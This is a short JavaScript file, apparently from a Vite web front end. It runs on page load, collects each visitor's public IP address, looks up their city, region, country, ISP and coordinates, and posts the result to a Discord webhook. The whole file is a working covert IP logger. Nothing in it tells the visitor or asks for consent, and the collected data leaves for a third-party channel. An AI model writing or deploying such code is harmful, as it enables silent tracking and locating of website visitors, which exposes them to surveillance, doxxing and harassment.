async function fetchAndSendIpAddress() {
    try {
        // Schritt 1: IP-Adresse abrufen
        const ipResponse = await fetch('https://api.ipify.org/?format=json');
        const ipData = await ipResponse.json();
        const ipAddress = ipData.ip;

        // Schritt 2: Zusätzliche Informationen zur IP-Adresse abrufen
        const token = import.meta.env.VITE_IPINFO_TOKEN;
        const infoResponse = await fetch(`https://ipinfo.io/${ipAddress}/json?token=${token}`);
        const infoData = await infoResponse.json();

        // Schritt 3: Nachricht zusammenstellen
        const message = `
            IP-Adresse: ${ipAddress}
            Stadt: ${infoData.city || 'Nicht verfügbar'}
            Region: ${infoData.region || 'Nicht verfügbar'}
            Land: ${infoData.country || 'Nicht verfügbar'}
            ISP: ${infoData.org || 'Nicht verfügbar'}
            Geolocation: ${infoData.loc || 'Nicht verfügbar'}
        `;

        // Schritt 4: IP-Adresse und Informationen an Discord Webhook senden
        const webhookURL = import.meta.env.VITE_DISCORD_WEBHOOK_URL;

        const payload = {
            content: message
        };

        const webhookResponse = await fetch(webhookURL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(payload)
        });

        if (webhookResponse.ok) {
            console.log('Informationen erfolgreich an Discord gesendet');
        } else {
            console.error('Fehler beim Senden an Discord', webhookResponse.statusText);
        }
    } catch (error) {
        console.error('Fehler:', error);
    }
}

// Funktion aufrufen
fetchAndSendIpAddress();
